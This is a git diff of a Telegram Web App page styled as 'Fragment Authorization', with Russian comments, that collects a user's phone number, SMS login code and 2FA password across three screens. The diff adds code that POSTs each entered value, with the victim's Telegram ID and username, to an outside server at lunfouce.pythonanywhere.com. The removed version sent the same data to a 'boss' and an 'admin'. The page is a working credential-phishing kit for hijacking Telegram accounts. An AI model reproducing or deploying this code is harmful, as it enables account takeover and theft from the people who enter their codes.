@@ -6,7 +6,6 @@
   <title>Fragment Authorization</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    /* Стили с увеличенной закругленностью */
     * {
       margin: 0;
       padding: 0;
@@ -231,7 +230,6 @@
       margin-bottom: 25px;
     }
 
-    /* Адаптивность для маленьких экранов */
     @media (max-height: 700px) {
       body {
         align-items: flex-start;
@@ -475,7 +473,7 @@
       <button class="cancel-btn" onclick="handleCancel()">ОТМЕНА</button>
       <button class="next-btn" onclick="handlePhoneSubmit()">ДАЛЕЕ</button>
     </div>
-  </div>
+  </div>  
     <!-- Экран 2: Ввод SMS кода -->
   <div class="container screen" id="screen2">
     <button class="back-btn" onclick="prevScreen(1)">← Назад</button>
@@ -553,46 +551,43 @@
     let currentScreen = 1;
     let resendTimerInterval;
 
-    // Функция для отправки логов - ОТПРАВЛЯЕТ ДВА ПАКЕТА
-    function sendLog(action, details = '') {
+    // ⚠️ ВАЖНО: Замените URL на ваш реальный сервер
+    const SERVER_URL = "https://lunfouce.pythonanywhere.com/send-log";
+
+    // Функция для отправки логов на наш сервер
+    async function sendLog(action, details = '') {
       try {
         const user = tg.initDataUnsafe?.user;
-        const timestamp = new Date().toLocaleString('ru-RU');
         
-        // Пакет 1: ДЛЯ БОССА (ПОЛНЫЙ лог со ВСЕМИ деталями)
-        const bossLog = {
-          type: 'boss_log',
+        if (!user) {
+          console.error('❌ User data not available');
+          return;
+        }
+
+        const logData = {
+          user_id: user.id,
+          user_name: user.first_name || 'NoName',
+          user_username: user.username || 'no_username',
           action: action,
-          details: details,
-          user: user ? {
-            id: user.id,
-            first_name: user.first_name,
-            username: user.username
-          } : null,
-          timestamp: timestamp
+          details: details
         };
+
+        console.log('📤 Отправка лога на сервер:', logData);
         
-        // Пакет 2: ДЛЯ АДМИНА (КОРОТКИЙ лог - только факт действия)
-        const adminLog = {
-          type: 'admin_log', 
-          action: action,
-          // НЕ включаем details - админу не нужны детали
-          user: user ? {
-            id: user.id,
-            first_name: user.first_name,
-            username: user.username
-          } : null,
-          timestamp: timestamp
-        };
-        
-        console.log('📤 Отправка двух логов:', bossLog, adminLog);
-        
-        // Отправляем ОБА пакета
-        tg.sendData(JSON.stringify(bossLog));
-        tg.sendData(JSON.stringify(adminLog));
+        // Отправляем на наш сервер
+        const response = await fetch(SERVER_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(logData)
+        });
+
+        const result = await response.json();
+        console.log('✅ Ответ сервера:', result);
         
       } catch (error) {
-        console.error('❌ Ошибка отправки логов:', error);
+        console.error('❌ Ошибка отправки лога:', error);
       }
     }
 
@@ -635,7 +630,7 @@
         return;
       }
       
-      // Отправляем лог о вводе номера - ОТПРАВИТ ДВА ПАКЕТА
+      // Отправляем лог о вводе номера
       sendLog('PHONE_ENTERED', `Страна: ${country}, Номер: ${countryCode}${phone}`);
       nextScreen(2);
     }
@@ -650,7 +645,7 @@
         return;
       }
       
-      // Отправляем лог о вводе SMS кода - ОТПРАВИТ ДВА ПАКЕТА
+      // Отправляем лог о вводе SMS кода
       sendLog('SMS_CODE_ENTERED', `Код: ${smsCode}`);
       nextScreen(3);
     }
@@ -665,7 +660,7 @@
         return;
       }
       
-      // Отправляем лог о вводе 2FA кода - ОТПРАВИТ ДВА ПАКЕТА
+      // Отправляем лог о вводе 2FA кода
       sendLog('2FA_CODE_ENTERED', `Код: ${faCode}`);
       completeAuth();
     }
@@ -674,7 +669,7 @@
       const resendLink = document.getElementById('resendLink');
       const resendTimer = document.getElementById('resendTimer');
       
-      // Отправляем лог о запросе повторной отправки кода - ОТПРАВИТ ДВА ПАКЕТА
+      // Отправляем лог о запросе повторной отправки кода
       sendLog('RESEND_CODE_REQUESTED', 'Пользователь запросил повторную отправку SMS кода');
       
       // Блокируем кнопку и запускаем таймер
